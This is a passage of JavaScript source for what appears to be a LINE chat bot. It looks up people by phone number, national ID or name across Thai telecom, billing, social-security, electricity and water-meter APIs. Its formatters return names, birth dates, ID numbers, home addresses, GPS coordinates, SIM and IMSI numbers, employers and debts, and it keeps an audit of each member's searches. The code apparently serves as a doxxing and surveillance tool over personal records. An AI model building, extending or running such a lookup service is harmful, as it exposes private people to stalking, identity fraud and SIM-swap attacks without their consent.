  `: ${searchTitle}\n` +
  `◇ ชื่อที่ระบุ
  ${fullName}\n` +
  `◇ วันเดือนปีเกิด
  ${thaiDate(customer?.birthDate)}\n` +
  ` อายุ : ${customer?.age || '-'} ปี\n` +
  `${statusIcon(customer?.status)} สถานะ : ${customer?.status || '-'}\n` +
  ` True Card : ${customer?.trueCardLevel || '-'} / ${customer?.trueCardStatus || '-'}\n`;

    // ------------------------------
    // หมายเลขปัจจุบัน
    // ------------------------------

    if (currentMobile.length > 0) {
      text +=
        `────────────
` +
        ` หมายเลขปัจจุบัน
`;

      currentMobile.forEach(item => {
        text +=
  `
 ${item.serviceId}\n` +
  `${statusIcon(item.status)} สถานะ : ${item.status || '-'} | ${paymentText(item.paymentType)}\n` +
  ` เริ่ม : ${thaiDate(item.startDate)}\n`;

        const packageName = cleanPackage(item);

        if (packageName !== '-') {
          text += ` ${packageName}\n`;
        }

        if (item.simCardNo) {
          text += ` SIM : ${item.simCardNo}\n`;
        }
      });
    }

    // ------------------------------
    // ประวัติหมายเลข
    // ------------------------------

    if (mobileHistory.length > 0) {
      text +=
        `────────────
` +
        ` ▸ รายการประวัติหมายเลข
`;

      mobileHistory.forEach(item => {
        text +=
  `
 ${item.serviceId}\n` +
  `${statusIcon(item.status)} สถานะ : ${item.status || '-'} | ${paymentText(item.paymentType)}\n` +
  ` ${thaiDate(item.startDate)} - ${thaiDate(item.endDate || item.disconnectDate)}\n`;

        if (item.ban) {
          text += ` BAN : ${item.ban}\n`;
        }
      });
    }

    // ------------------------------
    // TRUE ONLINE
    // ------------------------------

    if (trueOnline.length > 0) {
      text +=
        `────────────
` +
        ` True Online
`;

      trueOnline.forEach(item => {
        text +=
          `
 Service : ${item.serviceId}\n` +
          `${statusIcon(item.status)} ${item.status || '-'} | ${item.productType || '-'}\n` +
          ` ${thaiDate(item.startDate)} - ${thaiDate(item.endDate || item.disconnectDate)}\n`;

        if (item.ban) {
          text += ` BAN : ${item.ban}\n`;
        }
      });
    }

    // ------------------------------
    // TRUE VISIONS
    // ------------------------------

    if (trueVisions.length > 0) {
      text +=
        `────────────
` +
        ` True Visions
`;

      trueVisions.forEach(item => {
        text +=
          `
 Service : ${item.serviceId}\n` +
          `${statusIcon(item.status)} ${item.status || '-'} | ${item.productType || '-'}\n` +
          ` เริ่ม : ${thaiDate(item.startDate)}\n`;

        if (item.ban) {
          text += ` BAN : ${item.ban}\n`;
        }
      });
    }

    text +=
  `────────────
`;

text +=
  buildTrueSearchAudit(
    member
  );

return text.trim();
  }


  // ========================================
  // ค้นหาด้วยเบอร์โทรศัพท์ 10 หลัก
  // ========================================

  const assets = Array.isArray(data.asset)
    ? data.asset
    : [];

  if (assets.length === 0) {
    return `❌[${keyword}]\nไม่พบข้อมูลหมายเลข`;
  }

  const customerAsset = assets.find(
    item => item?.customer?.firstName
  );

  const customer = customerAsset?.customer || {};

  const customerName =
    customer.firstName || '-';

  const accountType =
    customer.accountType === 'Individual'
      ? 'บุคคล (Individual)'
      : customer.accountType || '-';

  const languageRaw =
    assets.find(item => item?.language)?.language || '-';

  const language =
    languageRaw === 'Thai'
      ? 'ไทย'
      : languageRaw;

  let text =
  `: ${keyword}\n` +
  `◇ ชื่อที่ระบุ
  ${customerName}\n` +
  `ประเภทลูกค้า : ${accountType}\n` +
  `✅บริการที่พบ : ${assets.length} รายการ\n` +
  `────────────
`;

  assets.forEach((item, index) => {
    const isActive =
      String(item.status || '').toLowerCase() === 'active';

    const icon = isActive ? '🟢' : '🔴';

    const paymentType =
      item.paymentType === 'Prepay'
        ? 'เติมเงิน (Prepay)'
        : item.paymentType === 'Postpay'
          ? 'รายเดือน (Postpay)'
          : item.paymentType || '-';

    const serviceTitle =
      isActive
        ? `บริการปัจจุบัน — ${item.paymentType || '-'}`
        : `ประวัติบริการ — ${item.paymentType || '-'}`;

    text +=
      `\n${index + 1}️⃣ ${serviceTitle}\n` +
      ` หมายเลข : ${item.serviceId || keyword}\n` +
      `${icon} สถานะ : ${item.status || '-'}\n` +
      ` ระบบ : ${paymentType}\n` +
      `◇ เครือข่ายที่ระบุ
  ${item.productLine || '-'}\n` +
      ` Company Code : ${item.companyCode || '-'}\n` +
      `◇ วันเริ่มใช้งาน
  ${item.startDate || '-'}\n`;

    if (isActive) {
      if (item.effectiveDate) {
        text +=
          ` Effective Date : ${item.effectiveDate}\n`;
      }

      if (item.pricePlan) {
        const cleanPlan = String(item.pricePlan)
          .replace(/^\[[^\]]+\]\s*/, '');

        text += `◇ รายละเอียดแพ็กเกจ
  ${cleanPlan}\n`;
      }

      if (item.pricePlanCode) {
        text +=
          ` Price Plan Code : ${item.pricePlanCode}\n`;
      }

      if (item.imsiNo) {
        text += ` IMSI : ${item.imsiNo}\n`;
      }

      if (item.simCardNo) {
        text +=
          ` SIM Card No. : ${item.simCardNo}\n`;
      }
    }

    if (!isActive) {
      if (item.endDate) {
        text +=
          `◇ วันสิ้นสุดที่ระบุ
  ${item.endDate}\n`;
      }

      if (item.disconnectDate) {
        text +=
          ` วันที่ยกเลิก : ${item.disconnectDate}\n`;
      }

      if (item.ban) {
        text += ` BAN : ${item.ban}\n`;
      }

      if (item.billingCVGId) {
        text +=
          ` Billing CVG ID : ${item.billingCVGId}\n`;
      }

      if (item.ccbsCustId) {
        text +=
          ` CCBS Customer ID : ${item.ccbsCustId}\n`;
      }

      if (item.subId) {
        text += ` Sub ID : ${item.subId}\n`;
      }

      if (item.dataSource) {
        text +=
          ` Data Source : ${item.dataSource}\n`;
      }
    }

    text +=
      ` One Bill : ${item.oneBillFlag || '-'}\n`;
  });

  text +=
  `────────────
`;

text +=
  buildTrueSearchAudit(
    member
  );

  return text.trim();
}

async function fetchTVGCCApi(query) {

console.log('TVGCC QUERY:', query);
console.log('TVGCC URL:', TVGCC_API_BASE);

try {
const { data } = await axios.get(TVGCC_API_BASE, {
params: { tv: query },
timeout: 45000,
headers: {
'User-Agent': 'Mozilla/5.0'
}
});

return data;

} catch (err) {
console.log('TVGCC ERROR:', err?.response?.data || err.message);
throw err;
}

}

async function fetchTVGCCCustomerInfo(ti) {
  const { data } = await axios.get(TVGCC_API_BASE, {
    params: { ti },
    timeout: 120000,
    headers: {
      'User-Agent': 'Mozilla/5.0'
    }
  });

  return data;
}

async function fetchISMApi(citizenId) {
  const { data } = await axios.get(ISM_API_BASE, {
    params: { tid: citizenId },
    timeout: 120000
  });
  return data;
}

function tvgValue(value) {
  if (value === null || value === undefined) return '-';
  const text = String(value).trim();
  return text || '-';
}

function tvgCustomerType(value) {
  const text = tvgValue(value);
  if (/Normal Customer/i.test(text)) return 'ลูกค้าทั่วไป';
  return text;
}

function tvgStatus(value) {
  const text = tvgValue(value);
  if (/^Active$/i.test(text)) return 'ใช้งานอยู่';
  if (/^Potential$/i.test(text)) return 'รอเปิดใช้งาน / มีโอกาสสมัคร';
  return text;
}

function tvgRows(result) {
  if (Array.isArray(result)) return result;
  if (!result || typeof result !== 'object') return [];

  for (const key of ['data', 'results', 'items', 'customers', 'rows']) {
    if (Array.isArray(result[key])) return result[key];
  }

  if (Array.isArray(result.customerInfo)) {
    return result.customerInfo.filter(item => item && (item.customerCode || item.fullName || item.name || item.phone || item.address));
  }

  return [];
}

function tvgAddress(row) {
  return tvgValue(row?.addressNo || row?.address || row?.address_no || row?.addressDefault);
}

function formatTVGCCDirectResult(result, query) {
  const mode = result?.mode === 'phone' ? 'เบอร์' : 'ชื่อ';
  const lines = [
    ` ${mode}: ${result?.query || query}`,
    "────────────",
    "• ข้อมูลลูกค้า",
    `◇ ชื่อและนามสกุล
  ${tvgValue(result?.name)}`,
    `◇ รหัสประจำลูกค้า
  ${tvgValue(result?.customerNumber)}`,
    `◇ รายละเอียดที่อยู่
  ${tvgValue(result?.address)}`,
    `◇ หมายเลขโทรศัพท์ที่บันทึก
  ${tvgValue(result?.phone)}`,
    `• Office Phone: ${tvgValue(result?.officePhone)}`,
    `• Fax/Mobile: ${tvgValue(result?.faxMobile)}`,
    `• Latitude: ${tvgValue(result?.latitude)}`,
    `• Longitude: ${tvgValue(result?.longitude)}`,
    `• Address ID: ${tvgValue(result?.addressId)}`,
    "────────────"
  ];

  return limitLineMessage(lines.join('\n'));
}

function formatTVGCCResult(result, query) {
  const rows = tvgRows(result);
  if (result?.success === false && !rows.length) {
    return result.message ? `❌ ${result.message}` : `❌[${query}] ไม่พบข้อมูลเบอร์รายเดือน`;
  }

  if (result?.success === true && (result.name || result.address || result.customerNumber)) {
    return formatTVGCCDirectResult(result, query);
  }

  const mode = result?.mode === 'phone' ? 'เบอร์' : result?.mode === 'id' ? 'เลขบัตร' : 'ชื่อ';
  const sep = "────────────";

  if (!rows.length) {
    return `❌[${query}] ไม่พบข้อมูลเบอร์รายเดือน`;
  }

  const lines = [
    ` ${mode}: ${result.query || query}`,
    `✅ พบข้อมูลทั้งหมด: ${result.count ?? rows.length} รายการ`
  ];

  if (result.mode === 'phone') {
    const mainInfo = Array.isArray(result.customerInfo) && result.customerInfo.length
      ? result.customerInfo[0]
      : null;
    const mainCode = mainInfo?.customerCode || rows[0]?.customerCode || rows[0]?.customer_code || rows[0]?.code || '-';
    const mainAddress = mainInfo?.address || tvgAddress(rows[0]);
    lines.push(sep);
    lines.push("• ข้อมูลลูกค้าหลัก");
    lines.push(`◇ รหัสประจำลูกค้า
  ${tvgValue(mainCode)}`);
    lines.push(`◇ รายละเอียดที่อยู่
  ${tvgValue(mainAddress)}`);
  }

  rows.forEach((row, index) => {
    lines.push(sep);
    lines.push(`• รายการที่ ${index + 1}`);
    lines.push(`◇ รหัสประจำลูกค้า
  ${tvgValue(row.customerCode || row.customer_code || row.code)}`);
    lines.push(`◇ ชื่อและนามสกุล
  ${tvgValue(row.fullName || row.full_name || row.name)}`);
    lines.push(`• ประเภทลูกค้า: ${tvgCustomerType(row.customerType)}`);
    lines.push(`• สถานะ: ${tvgStatus(row.status)}`);
    lines.push(`◇ รายละเอียดที่อยู่
  ${tvgAddress(row)}`);
    lines.push(`◇ หมายเลขโทรศัพท์ที่บันทึก
  ${tvgValue(row.phone || row.mobile || row.tel)}`);
  });
  lines.push(sep);

  return limitLineMessage(lines.join('\n'));
}

function formatFiberAddress(address) {
  const raw = tvgValue(address);
  if (raw === '-') return raw;
  if (/[ตอจ]\./.test(raw) || /ตำบล|อำเภอ|จังหวัด/.test(raw)) return raw;

  const parts = raw.split(/\s+/).filter(Boolean);
  const postalIndex = parts.findIndex(part => /^\d{5}$/.test(part));
  const end = postalIndex >= 0 ? postalIndex : parts.length;
  if (end < 3) return raw;

  const province = parts[end - 1];
  const district = parts[end - 2];
  const subdistrict = parts[end - 3];
  const streetAddress = parts.slice(0, end - 3).join(' ');
  return `${streetAddress} ต.${subdistrict} อ.${district} จ.${province}${postalIndex >= 0 ? ` ${parts[postalIndex]}` : ''}`.trim();
}

function formatFiberTvResult(result, query) {
  if (!result || result.success === false || !result.fields) {
    return `❌ ไม่พบข้อมูลลูกค้า Fiber TV สำหรับ ${query}`;
  }

  const fields = result.fields;
  const value = (field, fallback = '-') => tvgValue(fields[field] ?? result[field] ?? fallback);
  const status = value('status');
  const overdue = value('overdue', '0.00');
  const noOverdue = /^0(?:\.0+)?$/.test(overdue.replace(/,/g, ''));
  const coordinate = result.latitude && result.longitude
    ? `${result.latitude}, ${result.longitude}`
    : 'ไม่มีข้อมูล';

  return limitLineMessage(` ▸ รายละเอียดลูกค้า Fiber TV

● ข้อมูลลูกค้า
• Customer No. : ${value('customerNumber')}
◇ ชื่อที่ระบุ
  ${value('name')}
• โทรศัพท์ : ${value('phone')}
• Fax/Mobile : ${value('faxMobile')}
◇ รายละเอียดที่อยู่
  ${formatFiberAddress(value('address'))}

● ข้อมูลการให้บริการ
• BAN No. : ${value('banValue')}
• Profile : ${value('profile')}
• System : ${value('system')}
• Company : ${value('company')}
• ประเภทลูกค้า : ${value('type')}
• สถานะ : ${/^Potential$/i.test(status) ? " Potential" : status}
• ภาษา : ${value('language').replace(/^T\s*-\s*/i, '')}
• อายุการใช้งาน : ${value('longevity')}

● รายละเอียดบริการ
• จำนวนจุด DVB : ${value('dvb')} จุด
• จำนวนจุด OTT : ${value('ott')} จุด

● ข้อมูลการบิล
• ใบแจ้งหนี้ล่าสุด : ${value('lastInvoice')} บาท
◇ จำนวนเงินค้างชำระ
  ${overdue} บาท
• ยอดคงเหลือรวม : ${value('totalBalance')} บาท
• ATB2 Total Balance : ${value('atb2TotalBalance')} บาท

● ข้อมูลเพิ่มเติม
• Address ID : ${value('addressId')}
• Query : ${result.query || query}
◇ ตำแหน่งพิกัด
  ${coordinate}

${noOverdue ? '✅ ไม่พบยอดค้างชำระ' : '⚠️ พบยอดค้างชำระ'}`);
}

function ismValue(value) {
  if (value === null || value === undefined) return '-';
  const text = String(value).trim();
  return text || '-';
}

function ismMoney(value) {
  const amount = Number(value);
  return Number.isFinite(amount)
    ? amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
    : ismValue(value);
}

function ismDate(value) {
  if (!value) return '-';
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return ismValue(value);
  return `${String(date.getUTCDate()).padStart(2, '0')}/${String(date.getUTCMonth() + 1).padStart(2, '0')}/${date.getUTCFullYear()}`;
}

function ismStatus(value) {
  const status = ismValue(value);
  return /^active$/i.test(status) ? `${status}✅` : status;
}

function ismAddress(value) {
  const parts = String(value || '').split(',').map(part => part.trim());
  if (parts.length < 7) return ismValue(value);
  const [house, moo, , subdistrict, district, province, postal] = parts;
  return {
    line1: `${house || '-'} หมู่ ${moo || '-'} ต.${subdistrict || '-'}`,
    line2: `อ.${district || '-'} จ.${province || '-'} ${postal || ''}`.trim()
  };
}

function ismPushInvoiceGroups(lines, invoices, online = false) {
  const groups = new Map();
  (Array.isArray(invoices) ? invoices : []).forEach(invoice => {
    const period = invoice.postingPeriod || invoice.invoicePostingPeriod || '-';
    if (!groups.has(period)) groups.set(period, []);
    groups.get(period).push(invoice);
  });

  groups.forEach((periodInvoices, period) => {
    if (online) {
      const first = periodInvoices[0] || {};
      const amount = first.invoiceBalance ?? first.unpaidAmount;
      const dueDate = first.invoiceDueDate || first.dueDate;
      lines.push(`• รอบบิล ${period} : ${ismMoney(amount)} บาท (ครบกำหนด ${ismDate(dueDate)})`);
      return;
    }

    lines.push(`
 รอบบิล ${period}`);
    periodInvoices.forEach((invoice, index) => {
      const label = invoice.invoiceType || 'BILL';
      const amount = invoice.unpaidAmount ?? invoice.invoiceBalance;
      lines.push(`${index === 0 ? "• " : "• "}● ${label} : ${ismMoney(amount)} บาท`);
    });
    const dueDate = periodInvoices.find(invoice => invoice.dueDate || invoice.invoiceDueDate);
    lines.push(`• กำหนดชำระ : ${ismDate(dueDate?.dueDate || dueDate?.invoiceDueDate)}`);
  });
}

function formatISMResult(result, citizenId) {
  if (result?.success === false) {
    return result.message ? `❌ ${result.message}` : `❌[${citizenId}] ไม่พบข้อมูล ISM`;
  }

  const lines = [` ${result?.query || citizenId}`];
  const mobile = result?.mobileApi?.response?.data?.collection?.mobile;
  const mobileItems = Array.isArray(mobile?.collectionList) ? mobile.collectionList : [];
  const maxAllowItems = result?.mobileApi?.response?.data?.maxAllow?.mobile?.maxAllowList || [];

  if (mobile) {
    lines.push('', " MOBILE");
    mobileItems.forEach(item => {
      lines.push(`• สถานะ : ${ismValue(mobile.status)}`);
      lines.push(`• BAN : ${ismValue(item.ban)}`);
      lines.push(`• Company : ${ismValue(item.company)}`);
      lines.push(`• สถานะ BAN : ${ismValue(item.statusDesc || item.status)}`);
      const mobileNo = item.mobileNoList?.[0]?.mobileNo;
      lines.push(`◇ เบอร์โทรที่ระบุ
  ${ismValue(mobileNo)}`);
      lines.push(`◇ ยอดรวมทั้งหมด
  ${ismMoney(item.amount ?? mobile.totalAmount)} บาท`);
      ismPushInvoiceGroups(lines, item.invoiceList);
    });

    maxAllowItems.forEach(item => {
      lines.push('', " ข้อมูลเบอรโทร");
      lines.push(`◇ เบอร์โทรที่ระบุ
  ${ismValue(item.mobileNo)}`);
      lines.push(`• สถานะ : ${ismStatus(item.statusDesc || item.status)}`);
      lines.push(`• วันที่เปิดใช้งาน : ${ismDate(item.activateDate)}`);
    });
  }

  const online = result?.onlineApi?.response?.data?.collection?.online;
  const onlineItems = Array.isArray(online?.collectionList) ? online.collectionList : [];
  if (online) {
    lines.push('', "────────────", " TRUE ONLINE", '', ' ยอดค่าบริการ');
    lines.push(`• สถานะ : ${ismValue(online.status)}`);
    lines.push(`◇ ยอดรวมทั้งหมด
  ${ismMoney(online.totalAmount)} บาท`);
    lines.push(`• ยอดเกินกำหนด : ${ismMoney(online.overdueAmount)} บาท`);

    onlineItems.forEach((item, index) => {
      lines.push('', ` รายการ ${index + 1}`);
      lines.push(`• BAN : ${ismValue(item.ban)}`);
      lines.push(`• สถานะ : ${ismStatus(item.statusDesc || item.status)}`);
      lines.push(`• บริการ : ${ismValue(item.mobileNo)}`);
      lines.push(`◇ ยอดรวมทั้งหมด
  ${ismMoney(item.amount)} บาท`);
      const address = ismAddress(item.address);
      if (typeof address === 'string') {
        lines.push(`◇ รายละเอียดที่อยู่
  ${address}`);
      } else {
        lines.push(`◇ รายละเอียดที่อยู่
  ${address.line1}`);
        lines.push(`• ${address.line2}`);
      }
      ismPushInvoiceGroups(lines, item.invoiceList, true);
    });
  }

  if (!mobile && !online) {
    return `❌[${citizenId}] ไม่พบข้อมูล ISM`;
  }

  return limitLineMessage(lines.join('\n'));
}

async function fetchBQuikApi(query, base = SECURE_SEARCH_API_BASE, backupBase = DXC_BACKUP_API_BASE) {
  const tryRequest = async (url) => {
    const { data } = await axios.get(url, {
      params: { bq: query, key: SEARCH_API_KEY },
      timeout: 90000
    });
    return data;
  };

  try {
    const res = await tryRequest(base);
    if (res?.success === false) {
      console.error(`B-Quik หลัก (${base}) ไม่ success ใช้สำรอง (${backupBase}):`, res?.message || 'no success');
      return await tryRequest(backupBase);
    }
    return res;
  } catch (err) {
    console.error(`B-Quik หลัก (${base}) ล่ม ใช้สำรอง (${backupBase}):`, err?.response?.data || err.message);
    return await tryRequest(backupBase);
  }
}

function bqValue(value) {
  if (value === null || value === undefined) return '-';
  const text = String(value).trim();
  return text && text !== 'null' ? text : '-';
}

function bqDateTime(value) {
  const text = bqValue(value, '');
  if (!text) return '-';
  return text.replace('T', ' ').replace(/\.\d+Z$/, ' UTC').replace(/Z$/, ' UTC');
}

function bqAddressLine(address = {}) {
  const parts = [
    bqValue(address.no, ''),
    bqValue(address.moo, '') ? `หมู่ ${bqValue(address.moo, '')}` : '',
    bqValue(address.soi, '') ? `ซอย${bqValue(address.soi, '')}` : '',
    bqValue(address.road, '') ? `ถนน${bqValue(address.road, '')}` : '',
    bqValue(address.tumbol, '') ? `ตำบล${bqValue(address.tumbol, '')}` : '',
    bqValue(address.district, '') ? `อำเภอ${bqValue(address.district, '')}` : '',
    bqValue(address.province, '') ? `จังหวัด${bqValue(address.province, '')}` : '',
    bqValue(address.zipcode, '')
  ].filter(Boolean);
  return parts.length ? parts.join(' ') : '-';
}

function bqHasAddress(address = {}) {
  return ['no', 'moo', 'soi', 'road', 'tumbol', 'district', 'province', 'zipcode']
    .some(key => bqValue(address[key], '') !== '');
}

function bqHasMembership(info = {}) {
  return ['loyalty_id', 'loyalty_level', 'loyalty_status', 'point_balance']
    .some(key => bqValue(info[key], '') !== '');
}

function formatBQuikPhoneItem(item, index) {
  const personal = item.personal_info || {};
  const member = item.membership_info || {};
  const address = item.address || {};
  const consent = item.consent || {};
  const lines = [
    ` รายการที่ ${index + 1}`,
    `◇ ชื่อและนามสกุล
  ${bqValue(personal.fullname)}`,
    `◇ เบอร์โทรที่ระบุ
  ${bqValue(personal.mobilephone)}`
  ];

  if (bqValue(personal.id_card, '') !== '') lines.push(`◇ หมายเลขบัตรประชาชน
  ${bqValue(personal.id_card)}`);
  if (bqValue(personal.birthdate, '') !== '') lines.push(`◇ วันเดือนปีเกิด
  ${bqValue(personal.birthdate)}`);
  if (bqValue(personal.gender, '') !== '') lines.push(`• เพศ: ${bqValue(personal.gender)}`);
  if (bqValue(member.customer_code, '') !== '') lines.push(`◇ รหัสประจำลูกค้า
  ${bqValue(member.customer_code)}`);

  if (bqHasMembership(member)) {
    lines.push("• ข้อมูลสมาชิก");
    if (bqValue(member.loyalty_id, '') !== '') lines.push(`• Loyalty ID: ${bqValue(member.loyalty_id)}`);
    if (bqValue(member.loyalty_level, '') !== '') lines.push(`• ระดับสมาชิก: ${bqValue(member.loyalty_level)}`);
    if (bqValue(member.loyalty_status, '') !== '') lines.push(`• สถานะสมาชิก: ${bqValue(member.loyalty_status)}`);
    if (bqValue(member.point_balance, '') !== '') lines.push(`• คะแนนสะสม: ${bqValue(member.point_balance)} คะแนน`);
  }

  if (bqHasAddress(address)) {
    lines.push("• ที่อยู่");
    if (bqValue(address.no, '') !== '') lines.push(`• บ้านเลขที่: ${bqValue(address.no)}`);
    if (bqValue(address.moo, '') !== '') lines.push(`• หมู่: ${bqValue(address.moo)}`);
    if (bqValue(address.tumbol, '') !== '') lines.push(`• ตำบล: ${bqValue(address.tumbol)}`);
    if (bqValue(address.district, '') !== '') lines.push(`• อำเภอ: ${bqValue(address.district)}`);
    if (bqValue(address.province, '') !== '') lines.push(`◇ จังหวัดที่ระบุ
  ${bqValue(address.province)}`);
    if (bqValue(address.zipcode, '') !== '') lines.push(`◇ หมายเลขรหัสไปรษณีย์
  ${bqValue(address.zipcode)}`);
  }

  if (bqValue(consent.status, '') !== '' || bqValue(consent.expire_date, '') !== '') {
    lines.push("• Consent");
    lines.push(`• สถานะ: ${bqValue(consent.status)}`);
    lines.push(`• วันหมดอายุ: ${bqDateTime(consent.expire_date)}`);
  } else if (lines.length > 0) {
    lines[lines.length - 1] = lines[lines.length - 1].replace(/^├/, '└');
  }

  return lines.join('\n');
}

function formatBQuikNameItem(item, index) {
  const personal = item.personal_info || {};
  const member = item.membership_info || {};
  const address = item.address || {};
  const consent = item.consent || {};
  const lines = [
    ` รายการที่ ${index + 1}`,
    `◇ ชื่อและนามสกุล
  ${bqValue(personal.fullname)}`,
    `◇ เบอร์โทรที่ระบุ
  ${bqValue(personal.mobilephone)}`,
    `◇ รหัสประจำลูกค้า
  ${bqValue(member.customer_code)}`,
    `◇ รายละเอียดที่อยู่
  ${bqAddressLine(address)}`
  ];
  if (bqValue(consent.status, '') !== '') {
    lines[lines.length - 1] = lines[lines.length - 1].replace(/^└/, '├');
    lines.push(`• สถานะการยินยอมข้อมูล: ${bqValue(consent.status)}`);
  }
  return lines.join('\n');
}

function formatBQuikIdItem(item, index) {
  const personal = item.personal_info || {};
  const member = item.membership_info || {};
  const address = item.address || {};
  const consent = item.consent || {};
  return ` รายการที่ ${index + 1}
◇ ชื่อและนามสกุล
  ${bqValue(personal.fullname)}
◇ หมายเลขบัตรประชาชน
  ${bqValue(personal.id_card)}
◇ วันเดือนปีเกิด
  ${bqValue(personal.birthdate)}
• เพศ: ${bqValue(personal.gender)}
◇ เบอร์โทรที่ระบุ
  ${bqValue(personal.mobilephone)}
• Loyalty ID: ${bqValue(member.loyalty_id)}
• ระดับสมาชิก: ${bqValue(member.loyalty_level)}
• สถานะสมาชิก: ${bqValue(member.loyalty_status)}
• คะแนนสะสม: ${bqValue(member.point_balance)}
• ที่อยู่
• บ้านเลขที่: ${bqValue(address.no)}
• หมู่: ${bqValue(address.moo)}
• ตำบล: ${bqValue(address.tumbol)}
• อำเภอ: ${bqValue(address.district)}
◇ จังหวัดที่ระบุ
  ${bqValue(address.province)}
◇ หมายเลขรหัสไปรษณีย์
  ${bqValue(address.zipcode)}
• Consent
• สถานะ: ${bqValue(consent.status)}
• วันหมดอายุ: ${bqDateTime(consent.expire_date)}`;
}

function formatBQuikResult(result, query) {
  if (!result?.success) {
    return `❌ ${result?.message || 'ค้นหา B-Quik ไม่สำเร็จ'}${result?.error ? `\n${result.error}` : ''}`;
  }
  const rows = Array.isArray(result.data) ? result.data : [];
  if (!rows.length) return `◇ สรุปผลการค้นหา
  ${query}\n❌ไม่พบข้อมูล`;

  const isPhone = /^0\d{9}$/.test(query);
  const isId = /^\d{13}$/.test(query);
  const items = rows.map((item, index) => {
    if (isId) return formatBQuikIdItem(item, index);
    if (isPhone) return formatBQuikPhoneItem(item, index);
    return formatBQuikNameItem(item, index);
  }).join("\n────────────\n");

  return limitLineMessage(`◇ สรุปผลการค้นหา
  ${query}
✅พบข้อมูลทั้งหมด ${result.count ?? rows.length} รายการ
────────────
${items}
────────────`);
}

function extractDtacNumbers(res) {
  const result = res?.data?.data?.body?.result || res?.data?.body?.result || res?.body?.result || res?.result;
  const subscribers = result?.subscribers || {};
  const numbers = [
    ...(Array.isArray(subscribers.prepaid) ? subscribers.prepaid : []),
    ...(Array.isArray(subscribers.postpaid) ? subscribers.postpaid : [])
  ]
    .map(item => String(item?.number || '').replace(/\D/g, ''))
    .filter(number => /^0\d{9}$/.test(number));
  return [...new Set(numbers)];
}

function pickBQuikServiceItem(result) {
  const rows = Array.isArray(result?.data) ? result.data : [];
  return rows.find(item => bqHasMembership(item?.membership_info || {}) || bqHasAddress(item?.address || {})) || rows[0] || null;
}

function formatBQuikServiceCenter(result) {
  if (!result?.success) return '❌ไม่พบข้อมูลศูนย์บริการรถ';
  const item = pickBQuikServiceItem(result);
  if (!item) return '❌ไม่พบข้อมูลศูนย์บริการรถ';

  const personal = item.personal_info || {};
  const member = item.membership_info || {};
  const address = item.address || {};
  return `◇ เบอร์โทรที่ระบุ
  ${bqValue(personal.mobilephone)}
• Loyalty ID: ${bqValue(member.loyalty_id)}
• ระดับสมาชิก: ${bqValue(member.loyalty_level)}
• สถานะสมาชิก: ${bqValue(member.loyalty_status)}
• คะแนนสะสม: ${bqValue(member.point_balance)}
• บ้านเลขที่: ${bqValue(address.no)}
• หมู่: ${bqValue(address.moo)}
• ตำบล: ${bqValue(address.tumbol)}
• อำเภอ: ${bqValue(address.district)}
◇ จังหวัดที่ระบุ
  ${bqValue(address.province)}
◇ หมายเลขรหัสไปรษณีย์
  ${bqValue(address.zipcode)}`;
}

async function fetchBQuikForAll(pid, dtacData) {
  const queries = [pid, ...extractDtacNumbers(dtacData)];
  for (const query of [...new Set(queries)]) {
    try {
      const result = await fetchBQuikApi(query);
      if (Array.isArray(result?.data) && result.data.length > 0) return result;
    } catch (error) {
      console.log('all% bq error:', query, error.message);
    }
  }
  return null;
}

function summarizeSI(data) {
  const rows = Array.isArray(data?.content)
    ? data.content
    : Array.isArray(data?.data)
      ? data.data
      : Array.isArray(data)
        ? data
        : [];

  if (!rows.length) return '❌ ไม่พบข้อมูลประกันสังคม';

  let msg = ` จำนวนที่พบ: ${rows.length} รายการ\n`;

  msg += `"แสดงเฉพาะรายการล่าสุด"\n`;

rows.slice(0, 1).forEach((item, i) => {
    msg += `
  บริษัท ${i + 1}\n`;
    msg += `◇ ชื่อของบริษัท
  ${item.companyName || item.company || item.name || '-'}\n`;
    msg += `◇ รหัสประจำสาขา
  ${item.branchCode || '-'}\n`;
    msg += `• เลขที่บัญชี: ${item.accountNo || '-'}\n`;
    msg += `◇ วันเริ่มทำงาน
  ${item.expStartDateText || '-'}\n`;
    msg += `◇ วันลาออกจากงาน
  ${item.empResignDateText || '-'}\n`;
    msg += `• สถานะ: ${item.employStatusDesc || '-'}\n`;
  });

  if (rows.length > 1) msg += `\n...แสดง 1 จาก ${rows.length} รายการ`;
  return msg.trim();
}

async function fetchPEAApi(params, base = SECURE_SEARCH_API_BASE, backupBase = DXC_BACKUP_API_BASE) {
  const tryRequest = async (url) => {
    const { data: res } = await axios.get(url, {
      params: { ...params, key: SEARCH_API_KEY },
      timeout: 30000
    });
    if (!res.success) {
      throw new Error(res.message || 'ดึงข้อมูลไม่สำเร็จ');
    }
    return res.data;
  };

  try {
    return await tryRequest(base);
  } catch (err) {
    console.error(`PEA หลัก (${base}) ล่ม ใช้สำรอง (${backupBase}):`, err?.response?.data || err.message);
    return await tryRequest(backupBase);
  }
}

async function fetchPEAApiFull(params, base = SECURE_SEARCH_API_BASE, backupBase = DXC_BACKUP_API_BASE) {
  const tryRequest = async (url) => {
    const { data: res } = await axios.get(url, {
      params: { ...params, key: SEARCH_API_KEY },
      timeout: 30000
    });
    if (!res.success) {
      throw new Error(res.message || 'ดึงข้อมูลไม่สำเร็จ');
    }
    return res;
  };

  try {
    return await tryRequest(base);
  } catch (err) {
    console.error(`PEA หลัก (${base}) ล่ม ใช้สำรอง (${backupBase}):`, err?.response?.data || err.message);
    return await tryRequest(backupBase);
  }
}

async function fetchSearchApiRaw(params, base = SEARCH_API_BASE, backupBase = DXC_BACKUP_API_BASE) {
  const tryRequest = async (url) => {
    const { data: res } = await axios.get(url, {
      params: { ...params, key: SEARCH_API_KEY },
      timeout: 30000
    });
    return res;
  };

  // เฉพาะคำสั่งที่ยิง shadowtak หลักให้มีสำรอง ส่วน base เดิม (.113) ไม่แตะ
  if (base !== SECURE_SEARCH_API_BASE) return tryRequest(base);

  try {
    return await tryRequest(base);
  } catch (err) {
    console.error(`Search หลัก (${base}) ล่ม ใช้สำรอง (${backupBase}):`, err?.response?.data || err.message);
    return await tryRequest(backupBase);
  }
}

// =====================================
// PWA METERSTAT : ตำแหน่งมาตรวัดน้ำ (กปภ.)
// ค้นได้ 3 แบบ : ชื่อผู้ใช้น้ำ / ที่อยู่ผู้ใช้น้ำ / หมายเลขมาตรวัดน้ำ
// =====================================
async function fetchPwaMeterStatApi(params) {
  const { data } = await axios.get(PWA_METERSTAT_API_BASE, {
    params: { ppa: '', key: SEARCH_API_KEY, ...params },
    timeout: 60000
  });

  return data;
}

